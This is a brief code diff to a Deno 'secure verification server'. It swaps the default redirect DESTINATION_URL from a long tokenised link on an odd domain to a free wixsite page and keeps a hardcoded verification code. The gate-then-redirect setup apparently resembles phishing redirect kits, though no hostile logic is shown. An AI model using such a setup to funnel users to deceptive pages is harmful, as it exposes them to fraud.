@@ -11,7 +11,7 @@ interface AppConfig {
 }
 
 const CONFIG: AppConfig = {
-  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://wd0c435.ourdistrictcouncils.com/lgTDmtCC?fl=LXKEV293WT65FOG7oPAEuhoPw-LIJwNeStPL04nP4wm4cnePcp2aNu7DXhvavjdIOQ",
+  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://misterfix3.wixsite.com/my-site-1",
   VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
   PORT: Number(Deno.env.get("PORT")) || 8000,
   SESSION_TIMEOUT: 15 * 60 * 1000, // 15 minutes in milliseconds
@@ -710,4 +710,5 @@ async function handleRequest(req: Request): Promise<Response> {
 console.log(`Secure verification server running on port ${CONFIG.PORT}`);
 
 serve(handleRequest, { port: CONFIG.PORT });
+
 
